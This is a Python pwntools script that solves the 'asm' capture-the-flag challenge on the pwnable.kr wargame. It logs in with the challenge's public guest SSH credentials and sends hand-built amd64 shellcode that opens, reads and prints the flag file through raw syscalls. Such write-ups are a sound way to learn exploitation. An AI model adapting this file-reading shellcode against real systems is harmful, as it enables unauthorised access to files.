from pwn import *
import binascii

# asm
host = 'pwnable.kr'
user = 'asm'
password = 'guest'
port = 2222

filename = 'this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong'

# Notes
#  * you can't do `mov rdi, rip` for _reasons_, but
#    `lea rdi, [rip]` does what we want

def attack():
  s = ssh(host=host, user=user, password=password, port=port)
  p = s.process(['nc', '0', '9026'])
  print p.recv()
  context.update(arch='amd64', os='linux')
  shellcode = ''
  shellcode += asm('lea rdi, [rip]')
  shellcode += asm('add rdi, 51')
  shellcode += asm('mov rax, 2')
  shellcode += asm('syscall')
  shellcode += asm('mov rsi, rdi')
  shellcode += asm('mov rdi, rax')
  shellcode += asm('mov rdx, 30')
  shellcode += asm('mov rax, 0')
  shellcode += asm('syscall')
  shellcode += asm('mov rax, 1')
  shellcode += asm('mov rdi, 0')
  shellcode += asm('syscall')
  shellcode += filename + '\x00'
  p.send(shellcode)
  print p.recv()

if __name__ == '__main__':
  attack()
